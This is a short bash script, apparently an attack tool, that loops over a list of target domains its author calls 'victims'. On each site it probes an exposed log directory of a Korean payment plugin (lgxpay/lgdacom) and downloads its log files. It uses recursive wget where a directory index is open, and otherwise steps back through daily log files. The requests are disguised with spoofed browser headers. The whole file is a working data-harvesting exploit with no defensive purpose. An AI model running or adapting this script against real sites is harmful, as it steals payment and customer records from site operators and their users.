#!/usr/bin/bash
# 
victims=("example.com
example.org
...
...")
for domain in ${victims[@]}; 
do 
    if [ $(curl -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -s -o /dev/null -I -w "%{http_code}" http://$domain/plugin/lgxpay/lgdacom/log/) == 200 ]; then
    mkdir ./result/$domain
    echo "Downloading logs from $domain's index page"
    wget -q --connect-timeout=1 -r --level=1 -np --accept=*.log http://$domain/plugin/lgxpay/lgdacom/log/ -P ./result/$domain/
    echo "Finish. Finding next victim..."
    elif [ $(curl -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -s -o /dev/null -I -w "%{http_code}" http://$domain/plugin/lgxpay/lgdacom/log/log_`date +%Y%m%d`) == 200 ]; then
        echo "Detected there is no Index Page. Start downloading from today's log file. "
        i=0
        mkdir ./result/$domain
        while [ $(curl -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -s -o ./result/$domain/ -I -w "%{http_code}" http://$domain/plugin/lgxpay/lgdacom/log/log_`date +%Y%m%d -d -$i"day"`) == "200" ]
        do
            echo "Downloading $i log files from $domain"
            wget -q http://$domain/plugin/lgxpay/lgdacom/log/log_`date +%Y%m%d -d -$i"day"` -P ./result/$domain/
            i=$((i+1))
        done
    else  
    echo "?? 아 이건 좀...($domain)"
    fi
done
